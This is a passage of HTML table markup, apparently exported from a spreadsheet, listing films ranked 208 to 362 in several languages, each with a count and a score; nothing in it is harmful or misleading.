align="right">76</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">208</td> <td class="xl65">The Bourne Identity</td> <td class="xl66" align="right">50129</td> <td class="xl66" align="right">84</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">209</td> <td class="xl65">The Matrix Revolutions</td> <td class="xl66" align="right">49959</td> <td class="xl66" align="right">82</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">210</td> <td class="xl63">阿飛正傳</td> <td class="xl66" align="right">49722</td> <td class="xl66" align="right">84</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">211</td> <td class="xl63">鹿鼎記</td> <td class="xl66" align="right">50470</td> <td class="xl66" align="right">77</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">212</td> <td class="xl63">クイール</td> <td class="xl66" align="right">49546</td> <td class="xl66" align="right">83</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">213</td> <td class="xl63">胭脂扣</td> <td class="xl66" align="right">49697</td> <td class="xl66" align="right">81</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">214</td> <td class="xl65">The Mummy</td> <td class="xl66" align="right">50231</td> <td class="xl66" align="right">76</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">215</td> <td class="xl65">Neko no ongaeshi</td> <td class="xl66" align="right">49622</td> <td class="xl66" align="right">78</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">216</td> <td class="xl63">武状元苏乞儿</td> <td class="xl66" align="right">50187</td> <td class="xl66" align="right">71</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">217</td> <td class="xl63">甲方乙方</td> <td class="xl66" align="right">48874</td> <td class="xl66" align="right">81</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">218</td> <td class="xl65">Bruce Almighty</td> <td class="xl66" align="right">49502</td> <td class="xl66" align="right">73</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">219</td> <td class="xl65">Stuart Little</td> <td class="xl66" align="right">49141</td> <td class="xl66" align="right">73</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">220</td> <td class="xl65">Dracula</td> <td class="xl66" align="right">48085</td> <td class="xl66" align="right">78</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">221</td> <td class="xl63">蓝宇</td> <td class="xl66" align="right">48016</td> <td class="xl66" align="right">77</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">222</td> <td class="xl63">无间道Ⅱ</td> <td class="xl66" align="right">47373</td> <td class="xl66" align="right">78</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">223</td> <td class="xl65">Legally Blonde</td> <td class="xl66" align="right">47909</td> <td class="xl66" align="right">72</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">224</td> <td class="xl65">Chocolat</td> <td class="xl66" align="right">45547</td> <td class="xl66" align="right">80</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">225</td> <td class="xl65">Hitch</td> <td class="xl66" align="right">45916</td> <td class="xl66" align="right">75</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">226</td> <td class="xl65">Mission: Impossible</td> <td class="xl66" align="right">45389</td> <td class="xl66" align="right">77</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">227</td> <td class="xl65">Catch Me If You Can</td> <td class="xl66" align="right">44413</td> <td class="xl66" align="right">83</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">228</td> <td class="xl65">Troy</td> <td class="xl66" align="right">45035</td> <td class="xl66" align="right">72</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">229</td> <td class="xl65">The Bourne Supremacy</td> <td class="xl66" align="right">42998</td> <td class="xl66" align="right">84</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">230</td> <td class="xl63">一个陌生女人的来信</td> <td class="xl66" align="right">43961</td> <td class="xl66" align="right">74</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">231</td> <td class="xl63">无间道Ⅲ终极无间</td> <td class="xl66" align="right">43823</td> <td class="xl66" align="right">75</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">232</td> <td class="xl65">Pretty Woman</td> <td class="xl66" align="right">43225</td> <td class="xl66" align="right">79</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">233</td> <td class="xl65">The Others</td> <td class="xl66" align="right">42485</td> <td class="xl66" align="right">79</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">234</td> <td class="xl65">Entrapment</td> <td class="xl66" align="right">42616</td> <td class="xl66" align="right">76</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">235</td> <td class="xl65">Sleepy Hollow</td> <td class="xl66" align="right">42276</td> <td class="xl66" align="right">77</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">236</td> <td class="xl63">逃學威龍</td> <td class="xl66" align="right">42189</td> <td class="xl66" align="right">72</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">237</td> <td class="xl65">색즉시공</td> <td class="xl66" align="right">42183</td> <td class="xl66" align="right">72</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">238</td> <td class="xl63">暗战</td> <td class="xl66" align="right">41033</td> <td class="xl66" align="right">82</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">239</td> <td class="xl65">You've Got Mail</td> <td class="xl66" align="right">41629</td> <td class="xl66" align="right">76</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">240</td> <td class="xl65">Moulin Rouge!</td> <td class="xl66" align="right">41107</td> <td class="xl66" align="right">79</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">241</td> <td class="xl65">Ocean's Eleven</td> <td class="xl66" align="right">41050</td> <td class="xl66" align="right">78</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">242</td> <td class="xl65">Cast Away</td> <td class="xl66" align="right">40362</td> <td class="xl66" align="right">83</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">243</td> <td class="xl65">Sister Act</td> <td class="xl66" align="right">40650</td> <td class="xl66" align="right">80</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">244</td> <td class="xl65">The Terminator</td> <td class="xl66" align="right">40797</td> <td class="xl66" align="right">78</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">245</td> <td class="xl65">The Nightmare Before Christmas</td> <td class="xl66" align="right">40236</td> <td class="xl66" align="right">83</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">246</td> <td class="xl65">Phone Booth</td> <td class="xl66" align="right">40495</td> <td class="xl66" align="right">79</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">247</td> <td class="xl63">一个都不能少</td> <td class="xl66" align="right">41178</td> <td class="xl66" align="right">72</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">248</td> <td class="xl65">X-Men</td> <td class="xl66" align="right">40888</td> <td class="xl66" align="right">74</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">249</td> <td class="xl63">孔雀</td> <td class="xl66" align="right">40389</td> <td class="xl66" align="right">77</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">250</td> <td class="xl65">Enemy at the Gates</td> <td class="xl66" align="right">39573</td> <td class="xl66" align="right">83</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">251</td> <td class="xl65">101 Dalmatians</td> <td class="xl66" align="right">40529</td> <td class="xl66" align="right">73</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">252</td> <td class="xl65">Tais-toi!</td> <td class="xl66" align="right">39742</td> <td class="xl66" align="right">79</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">253</td> <td class="xl65">Chicken Run</td> <td class="xl66" align="right">40070</td> <td class="xl66" align="right">74</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">254</td> <td class="xl65">The Mummy Returns</td> <td class="xl66" align="right">39984</td> <td class="xl66" align="right">73</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">255</td> <td class="xl65">Final Destination 2</td> <td class="xl66" align="right">39953</td> <td class="xl66" align="right">73</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">256</td> <td class="xl63">不见不散</td> <td class="xl66" align="right">39371</td> <td class="xl66" align="right">77</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">257</td> <td class="xl63">星願</td> <td class="xl66" align="right">40094</td> <td class="xl66" align="right">70</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">258</td> <td class="xl65">The Sisterhood of the Traveling Pants</td> <td class="xl66" align="right">38876</td> <td class="xl66" align="right">76</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">259</td> <td class="xl65">Fanfan</td> <td class="xl66" align="right">37954</td> <td class="xl66" align="right">81</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">260</td> <td class="xl65">Constantine</td> <td class="xl66" align="right">38476</td> <td class="xl66" align="right">76</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">261</td> <td class="xl65">Enemy of the State</td> <td class="xl66" align="right">38046</td> <td class="xl66" align="right">79</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">262</td> <td class="xl65">빈집</td> <td class="xl66" align="right">37736</td> <td class="xl66" align="right">80</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">263</td> <td class="xl65">Speed</td> <td class="xl66" align="right">37833</td> <td class="xl66" align="right">79</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">264</td> <td class="xl65">Cube</td> <td class="xl66" align="right">37608</td> <td class="xl66" align="right">80</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">265</td> <td class="xl65">The Piano</td> <td class="xl66" align="right">36993</td> <td class="xl66" align="right">81</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">266</td> <td class="xl63">鹿鼎记II神龙教</td> <td class="xl66" align="right">37532</td> <td class="xl66" align="right">75</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">267</td> <td class="xl63">苏州河</td> <td class="xl66" align="right">37253</td> <td class="xl66" align="right">76</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">268</td> <td class="xl65">Twelve Monkeys</td> <td class="xl66" align="right">36910</td> <td class="xl66" align="right">79</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">269</td> <td class="xl65">Cold Mountain</td> <td class="xl66" align="right">36907</td> <td class="xl66" align="right">78</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">270</td> <td class="xl65">Jumanji</td> <td class="xl66" align="right">36853</td> <td class="xl66" align="right">78</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">271</td> <td class="xl65">Tarzan</td> <td class="xl66" align="right">37283</td> <td class="xl66" align="right">74</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">272</td> <td class="xl65">My Best Friend's Wedding</td> <td class="xl66" align="right">37253</td> <td class="xl66" align="right">74</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">273</td> <td class="xl65">Natural Born Killers</td> <td class="xl66" align="right">36146</td> <td class="xl66" align="right">83</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">274</td> <td class="xl65">Million Dollar Baby</td> <td class="xl66" align="right">35618</td> <td class="xl66" align="right">82</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">275</td> <td class="xl65">The Bridges of Madison County</td> <td class="xl66" align="right">35087</td> <td class="xl66" align="right">84</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">276</td> <td class="xl65">Men in Black II</td> <td class="xl66" align="right">35906</td> <td class="xl66" align="right">73</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">277</td> <td class="xl65">The Last Emperor</td> <td class="xl66" align="right">34592</td> <td class="xl66" align="right">84</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">278</td> <td class="xl65">Lolita</td> <td class="xl66" align="right">34631</td> <td class="xl66" align="right">78</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">279</td> <td class="xl63">大红灯笼高高挂</td> <td class="xl66" align="right">34253</td> <td class="xl66" align="right">80</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">280</td> <td class="xl65">올드보이</td> <td class="xl66" align="right">33550</td> <td class="xl66" align="right">84</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">281</td> <td class="xl65">Beauty and the Beast</td> <td class="xl66" align="right">33827</td> <td class="xl66" align="right">81</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">282</td> <td class="xl65">Saw II</td> <td class="xl66" align="right">33952</td> <td class="xl66" align="right">79</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">283</td> <td class="xl65">Four Weddings and a Funeral</td> <td class="xl66" align="right">34363</td> <td class="xl66" align="right">75</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">284</td> <td class="xl65">Reservoir Dogs</td> <td class="xl66" align="right">33524</td> <td class="xl66" align="right">82</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">285</td> <td class="xl65">X2</td> <td class="xl66" align="right">34155</td> <td class="xl66" align="right">74</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">286</td> <td class="xl65">Shaun of the Dead</td> <td class="xl66" align="right">33186</td> <td class="xl66" align="right">79</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">287</td> <td class="xl65">Resident Evil</td> <td class="xl66" align="right">33254</td> <td class="xl66" align="right">76</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">288</td> <td class="xl65">The Italian Job</td> <td class="xl66" align="right">33286</td> <td class="xl66" align="right">75</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">289</td> <td class="xl65">The Italian Job</td> <td class="xl66" align="right">33281</td> <td class="xl66" align="right">75</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">290</td> <td class="xl63">我的父亲母亲</td> <td class="xl66" align="right">32876</td> <td class="xl66" align="right">76</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">291</td> <td class="xl65">A Walk in the Clouds</td> <td class="xl66" align="right">32456</td> <td class="xl66" align="right">78</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">292</td> <td class="xl63">有话好好说</td> <td class="xl66" align="right">32444</td> <td class="xl66" align="right">77</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">293</td> <td class="xl65">Elephant</td> <td class="xl66" align="right">32218</td> <td class="xl66" align="right">79</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">294</td> <td class="xl65">Banlieue 13</td> <td class="xl66" align="right">32074</td> <td class="xl66" align="right">80</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">295</td> <td class="xl65">American Pie</td> <td class="xl66" align="right">32496</td> <td class="xl66" align="right">73</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">296</td> <td class="xl65">Kate &amp; Leopold</td> <td class="xl66" align="right">32090</td> <td class="xl66" align="right">74</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">297</td> <td class="xl65">Shakespeare in Love</td> <td class="xl66" align="right">32031</td> <td class="xl66" align="right">73</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">298</td> <td class="xl63">心動</td> <td class="xl66" align="right">30708</td> <td class="xl66" align="right">81</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">299</td> <td class="xl63">整蛊专家</td> <td class="xl66" align="right">31306</td> <td class="xl66" align="right">70</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">300</td> <td class="xl63">红高粱</td> <td class="xl66" align="right">29911</td> <td class="xl66" align="right">81</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">301</td> <td class="xl63">笑傲江湖Ⅱ东方不败</td> <td class="xl66" align="right">30121</td> <td class="xl66" align="right">79</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">302</td> <td class="xl63">審死官</td> <td class="xl66" align="right">30957</td> <td class="xl66" align="right">71</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">303</td> <td class="xl63">新扎师妹</td> <td class="xl66" align="right">30451</td> <td class="xl66" align="right">75</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">304</td> <td class="xl63">呪怨</td> <td class="xl66" align="right">30433</td> <td class="xl66" align="right">73</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">305</td> <td class="xl65">Bridget Jones: The Edge of Reason</td> <td class="xl66" align="right">30379</td> <td class="xl66" align="right">73</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">306</td> <td class="xl63">リング</td> <td class="xl66" align="right">29955</td> <td class="xl66" align="right">75</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">307</td> <td class="xl65">Minority Report</td> <td class="xl66" align="right">29621</td> <td class="xl66" align="right">75</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">308</td> <td class="xl65">Heat</td> <td class="xl66" align="right">28329</td> <td class="xl66" align="right">84</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">309</td> <td class="xl65">The Bodyguard</td> <td class="xl66" align="right">28980</td> <td class="xl66" align="right">78</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">310</td> <td class="xl65">The Hours</td> <td class="xl66" align="right">28264</td> <td class="xl66" align="right">84</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">311</td> <td class="xl63">方世玉</td> <td class="xl66" align="right">28732</td> <td class="xl66" align="right">76</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">312</td> <td class="xl65">Air Force One</td> <td class="xl66" align="right">28871</td> <td class="xl66" align="right">74</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">313</td> <td class="xl65">Hannibal</td> <td class="xl66" align="right">27999</td> <td class="xl66" align="right">80</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">314</td> <td class="xl65">Un long dimanche de fiançailles</td> <td class="xl66" align="right">28011</td> <td class="xl66" align="right">79</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">315</td> <td class="xl65">Ocean's Twelve</td> <td class="xl66" align="right">28899</td> <td class="xl66" align="right">70</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">316</td> <td class="xl65">20 30 40</td> <td class="xl66" align="right">28647</td> <td class="xl66" align="right">72</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">317</td> <td class="xl65">Resident Evil: Apocalypse</td> <td class="xl66" align="right">28274</td> <td class="xl66" align="right">75</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">318</td> <td class="xl63">我是谁</td> <td class="xl66" align="right">28557</td> <td class="xl66" align="right">71</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">319</td> <td class="xl65">Underworld</td> <td class="xl66" align="right">28217</td> <td class="xl66" align="right">74</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">320</td> <td class="xl65">Matchstick Men</td> <td class="xl66" align="right">27204</td> <td class="xl66" align="right">81</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">321</td> <td class="xl65">Freaky Friday</td> <td class="xl66" align="right">27983</td> <td class="xl66" align="right">73</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">322</td> <td class="xl65">The Lost World: Jurassic Park</td> <td class="xl66" align="right">27568</td> <td class="xl66" align="right">75</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">323</td> <td class="xl63">賭聖</td> <td class="xl66" align="right">27920</td> <td class="xl66" align="right">71</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">324</td> <td class="xl65">Home Alone 2: Lost in New York</td> <td class="xl66" align="right">27219</td> <td class="xl66" align="right">76</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">325</td> <td class="xl63">玻璃之城</td> <td class="xl66" align="right">26856</td> <td class="xl66" align="right">79</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">326</td> <td class="xl63">美少年之恋</td> <td class="xl66" align="right">27497</td> <td class="xl66" align="right">73</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">327</td> <td class="xl63">平成狸合戦ぽんぽこ</td> <td class="xl66" align="right">26417</td> <td class="xl66" align="right">82</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">328</td> <td class="xl65">Geri's Game</td> <td class="xl66" align="right">26094</td> <td class="xl66" align="right">84</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">329</td> <td class="xl65">Serendipity</td> <td class="xl66" align="right">26848</td> <td class="xl66" align="right">76</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">330</td> <td class="xl65">Van Helsing</td> <td class="xl66" align="right">27056</td> <td class="xl66" align="right">70</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">331</td> <td class="xl65">시월애</td> <td class="xl66" align="right">25641</td> <td class="xl66" align="right">79</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">332</td> <td class="xl63">家有喜事</td> <td class="xl66" align="right">25371</td> <td class="xl66" align="right">78</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">333</td> <td class="xl63">枪火</td> <td class="xl66" align="right">24701</td> <td class="xl66" align="right">84</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">334</td> <td class="xl65">The Transporter</td> <td class="xl66" align="right">26084</td> <td class="xl66" align="right">71</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">335</td> <td class="xl63">世界の中心で、愛をさけぶ</td> <td class="xl66" align="right">25152</td> <td class="xl66" align="right">76</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">336</td> <td class="xl65">The Devil's Advocate</td> <td class="xl66" align="right">24436</td> <td class="xl66" align="right">81</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">337</td> <td class="xl65">Batman Begins</td> <td class="xl66" align="right">24762</td> <td class="xl66" align="right">78</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">338</td> <td class="xl63">异度空间</td> <td class="xl66" align="right">25262</td> <td class="xl66" align="right">73</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">339</td> <td class="xl63">蝴蝶</td> <td class="xl66" align="right">24793</td> <td class="xl66" align="right">76</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">340</td> <td class="xl65">Starship Troopers</td> <td class="xl66" align="right">24913</td> <td class="xl66" align="right">74</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">341</td> <td class="xl63">千年女優</td> <td class="xl66" align="right">23694</td> <td class="xl66" align="right">84</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">342</td> <td class="xl63">黃飛鴻之三獅王爭霸</td> <td class="xl66" align="right">24415</td> <td class="xl66" align="right">76</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">343</td> <td class="xl65">Alien</td> <td class="xl66" align="right">24291</td> <td class="xl66" align="right">77</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">344</td> <td class="xl63">没完没了</td> <td class="xl66" align="right">24710</td> <td class="xl66" align="right">73</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">345</td> <td class="xl65">The Machinist</td> <td class="xl66" align="right">23921</td> <td class="xl66" align="right">76</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">346</td> <td class="xl63">夜半歌声</td> <td class="xl66" align="right">23588</td> <td class="xl66" align="right">78</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">347</td> <td class="xl65">Liar Liar</td> <td class="xl66" align="right">23751</td> <td class="xl66" align="right">75</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">348</td> <td class="xl65">A River Runs Through It</td> <td class="xl66" align="right">22784</td> <td class="xl66" align="right">83</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">349</td> <td class="xl65">The Game</td> <td class="xl66" align="right">23245</td> <td class="xl66" align="right">78</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">350</td> <td class="xl65">The Game</td> <td class="xl66" align="right">23214</td> <td class="xl66" align="right">78</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">351</td> <td class="xl63">开往春天的地铁</td> <td class="xl66" align="right">24015</td> <td class="xl66" align="right">70</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">352</td> <td class="xl65">The Hitchhiker's Guide to the Galaxy</td> <td class="xl66" align="right">22700</td> <td class="xl66" align="right">81</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">353</td> <td class="xl65">Chicago</td> <td class="xl66" align="right">22535</td> <td class="xl66" align="right">82</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">354</td> <td class="xl63">寻枪</td> <td class="xl66" align="right">23044</td> <td class="xl66" align="right">75</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">355</td> <td class="xl63">忘不了</td> <td class="xl66" align="right">22915</td> <td class="xl66" align="right">76</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">356</td> <td class="xl65">21 Grams</td> <td class="xl66" align="right">22407</td> <td class="xl66" align="right">80</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">357</td> <td class="xl63">太極張三豐</td> <td class="xl66" align="right">23192</td> <td class="xl66" align="right">72</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">358</td> <td class="xl63">黃飛鴻</td> <td class="xl66" align="right">22620</td> <td class="xl66" align="right">77</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">359</td> <td class="xl65">Finding Neverland</td> <td class="xl66" align="right">22260</td> <td class="xl66" align="right">78</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">360</td> <td class="xl65">Sense and Sensibility</td> <td class="xl66" align="right">21801</td> <td class="xl66" align="right">81</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">361</td> <td class="xl63">旺角卡門</td> <td class="xl66" align="right">22431</td> <td class="xl66" align="right">75</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">362</td> <td class="xl65">Original Sin</td> <td class="xl66" align="right">22521</td> <td class="xl66" 